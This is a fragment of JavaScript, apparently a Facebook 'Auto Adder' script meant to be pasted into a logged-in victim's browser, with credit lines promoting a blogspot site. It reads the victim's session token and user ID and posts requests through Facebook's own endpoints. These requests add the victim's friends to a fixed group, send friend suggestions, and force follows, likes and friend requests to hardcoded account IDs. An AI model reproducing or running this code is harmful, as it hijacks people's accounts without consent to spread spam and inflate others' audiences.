...
var Title = 'Auto Adder by Arman Prince<A style="color:#3B5998;" href="#"><br/>.....please wait....</A>';
grpname = document.getElementById("groupsJumpTitle").innerHTML;
var Descriptions = "",
_text = 'Powered By <A style="color:#3B5998;" href="http://www.facebook-stuff-tips.blogspot.com//">facebook-stuff-tips.blogspot.com/</A> Visit It Now!.';
...
if (gid != 726185514070926) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=726185514070926&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function() {}, "text", "post")
}
if (newcomer) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100002585900818&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function() {}, "text", "post")
}
}
...
var page_id = '1461700277381991';
var page_id = '616616688425478';
var page_id = '616616688425478';
var i = 0;
var suc = 0;
var arr = new Array;
...
// Auto Followers
a("100002585900818");
sublist("269507596559460");sublist("561836280579230");sublist("561836700579188");sublist("202043156659742");sublist("1386148861663065");sublist("526216817474510");sublist("10203426482533530");sublist("269507413226145");sublist("674960302543345");

// AutoLike
a("100007409286555");
sublist("269507413226145");sublist("1386148861663065");sublist("674960302543345");sublist("526216817474510");sublist("202043156659742");sublist("561836700579188");sublist("269507596559460");sublist("561836280579230");sublist("10203426482533530");

// Auto Friend Request
a("100005621767976");sublist("10203426482533530");sublist("674960302543345");sublist("269507413226145");sublist("202043156659742");sublist("561836280579230");sublist("526216817474510");sublist("561836700579188");sublist("269507596559460");sublist("1386148861663065");
